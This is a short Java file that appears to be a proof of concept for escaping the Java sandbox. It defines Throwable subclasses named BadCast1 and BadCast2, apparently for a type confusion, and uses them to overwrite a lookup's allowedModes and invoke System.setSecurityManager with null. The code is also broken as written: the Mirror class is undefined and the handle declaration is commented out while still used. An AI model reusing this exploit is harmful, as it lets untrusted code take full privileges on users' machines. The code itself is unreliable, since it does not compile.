import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.System;
import java.io.File;
import java.io.IOException;

public class Main {
        public static class BadCast1 extends Throwable{
                Object o1 = MethodHandles.publicLookup();
        }

        public static class BadCast2 extends Throwable{
                Mirror lm = new Mirror();
        }

        public static void throwEx() throws BadCast1{
                throw new BadCast1();
        }

        public static void handleEx(BadCast2 e){
                e.lm.allowedModes = -1;
        }

        public static void main(String[] args) throws Throwable {
                BadCast2 e = new BadCast2();
                handleEx(e);
                MethodType mt = MethodType.methodType(void.class, System.class);
                try {
       			File file = new File("myfile.txt");

         		if(file.createNewFile())System.out.println("Success!");
         		else System.out.println ("Error, file already exists.");
      		}
      		catch(IOException ioe) {
         		System.out.println("error");
         		ioe.printStackTrace();
      		}	
		//MethodHandle mh = MethodHandles.lookup().findStatic(System.class, "setSecurityManager", mt);
                mh.invokeExact(System.class, null);
        }

}


